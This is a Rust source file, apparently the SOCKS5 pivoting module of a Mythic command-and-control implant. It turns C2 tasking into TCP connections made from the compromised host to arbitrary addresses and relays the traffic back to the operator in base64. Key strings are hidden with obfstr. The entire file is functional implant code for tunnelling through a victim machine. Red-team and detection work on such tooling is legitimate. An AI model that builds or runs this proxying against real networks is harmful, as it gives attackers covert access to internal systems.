use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Mutex;
use base64::decode;
use lazy_static::lazy_static;
use obfstr::obfstr;
use serde_json::Value;

lazy_static! {
    static ref CONNECTIONS: Mutex<HashMap<u64, TcpStream>> = Mutex::new(HashMap::new());
}

fn post_socks(server_id: u64, exit: bool, data_b64: &str) -> Result<(), Box<dyn std::error::Error>> {
    let response = serde_json::json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("socks"): [
            {
                "exit": exit,
                "server_id": server_id,
                "data": data_b64
            }
        ]
    });
    crate::transport::send_request(&response.to_string())?;
    Ok(())
}

/// Tell Mythic the SOCKS channel for `server_id` is dead so the client is not
/// left hanging after connect/write failures.
fn close_socks(server_id: u64) {
    let _ = CONNECTIONS.lock().map(|mut m| m.remove(&server_id));
    let _ = post_socks(server_id, true, "");
}

pub fn handle_socks(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    let server_id = task
        .get("server_id")
        .ok_or("missing server_id")?
        .as_u64()
        .ok_or("server_id is not a u64")?;
    let exit = task
        .get("exit")
        .ok_or("missing exit")?
        .as_bool()
        .ok_or("exit is not a boolean")?;

    if exit {
        CONNECTIONS.lock()?.remove(&server_id);
        post_socks(server_id, true, "")?;
        return Ok(());
    }

    let b64 = task
        .get("data")
        .ok_or("missing data")?
        .as_str()
        .ok_or("data is not a string")?;
    let payload = decode(b64)?;

    let mut conns = CONNECTIONS.lock()?;
    if !conns.contains_key(&server_id) {
        if payload.len() < 4 {
            drop(conns);
            close_socks(server_id);
            return Err("socks connect payload too short".into());
        }

        let atyp = payload[3];
        let (addr, port) = match atyp {
            0x01 => {
                // IPv4
                if payload.len() < 10 {
                    drop(conns);
                    close_socks(server_id);
                    return Err("socks ipv4 payload too short".into());
                }
                let ip = &payload[4..8];
                let port = u16::from_be_bytes([payload[8], payload[9]]);
                (
                    format!("{}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3]),
                    port,
                )
            }
            0x03 => {
                // Domain name
                if payload.len() < 5 {
                    drop(conns);
                    close_socks(server_id);
                    return Err("socks domain payload too short".into());
                }
                let len = payload[4] as usize;
                if payload.len() < 5 + len + 2 {
                    drop(conns);
                    close_socks(server_id);
                    return Err("socks domain payload truncated".into());
                }
                let domain = String::from_utf8_lossy(&payload[5..5 + len]);
                let port = u16::from_be_bytes([payload[5 + len], payload[6 + len]]);
                (domain.to_string(), port)
            }
            0x04 => {
                // IPv6
                if payload.len() < 22 {
                    drop(conns);
                    close_socks(server_id);
                    return Err("socks ipv6 payload too short".into());
                }
                let ip = &payload[4..20];
                let segments: Vec<String> = ip
                    .chunks(2)
                    .map(|chunk| format!("{:02x}{:02x}", chunk[0], chunk[1]))
                    .collect();
                let ip_str = format!("[{}]", segments.join(":"));
                let port = u16::from_be_bytes([payload[20], payload[21]]);
                (ip_str, port)
            }
            _ => {
                drop(conns);
                close_socks(server_id);
                return Err("Unsupported address type".into());
            }
        };

        let target_addr = format!("{addr}:{port}");
        crate::dlog!("[SOCKS] connect target_addr={target_addr} atyp={atyp}");

        let stream = match TcpStream::connect(&target_addr) {
            Ok(s) => {
                crate::dlog!("[SOCKS] TcpStream::connect ok");
                s
            }
            Err(e) => {
                crate::dlog!("[SOCKS] TcpStream::connect failed: {e:?}");
                // Must release the map lock before posting over C2.
                drop(conns);
                close_socks(server_id);
                return Err(e.into());
            }
        };
        conns.insert(server_id, stream);
        let stream = conns.get_mut(&server_id).unwrap();

        // SOCKS5 CONNECT reply (success)
        let mut response = vec![
            0x05, // VER
            0x00, // REP: succeeded
            0x00, // RSV
        ];

        if let Ok(std::net::SocketAddr::V4(v4)) = stream.local_addr() {
            response.push(0x01); // ATYP: IPv4
            response.extend(&v4.ip().octets());
            response.extend(&v4.port().to_be_bytes());
        } else {
            response.extend(&[0x01, 0, 0, 0, 0, 0, 0]);
        }

        let b64_response = base64::encode(&response);
        drop(conns);
        post_socks(server_id, false, &b64_response)?;
        return Ok(());
    }

    if let Some(stream) = conns.get_mut(&server_id) {
        if let Err(e) = stream.write_all(&payload) {
            crate::dlog!("[SOCKS] Write error, closing: {e:?}");
            drop(conns);
            close_socks(server_id);
            return Err(e.into());
        }

        let _ = stream.set_nonblocking(true);
        let mut response_data = Vec::new();
        let mut buf = [0u8; 8192];
        let mut peer_closed = false;

        // Brief yield so the remote can produce a first response chunk.
        // Full streaming is still poll-driven by Mythic get_tasking rounds.
        std::thread::sleep(std::time::Duration::from_millis(100));

        loop {
            match stream.read(&mut buf) {
                Ok(0) => {
                    crate::dlog!("[SOCKS] Connection closed by remote");
                    peer_closed = true;
                    break;
                }
                Ok(n) => response_data.extend_from_slice(&buf[..n]),
                Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => break,
                Err(e) => {
                    crate::dlog!("[SOCKS] Read error: {e:?}");
                    peer_closed = true;
                    break;
                }
            }
        }
        let _ = stream.set_nonblocking(false);

        let b64_response = base64::encode(&response_data);
        if peer_closed {
            drop(conns);
            // Deliver any final bytes, then close the Mythic side.
            let _ = post_socks(server_id, false, &b64_response);
            close_socks(server_id);
            return Ok(());
        }

        drop(conns);
        post_socks(server_id, false, &b64_response)?;
    }
    Ok(())
}
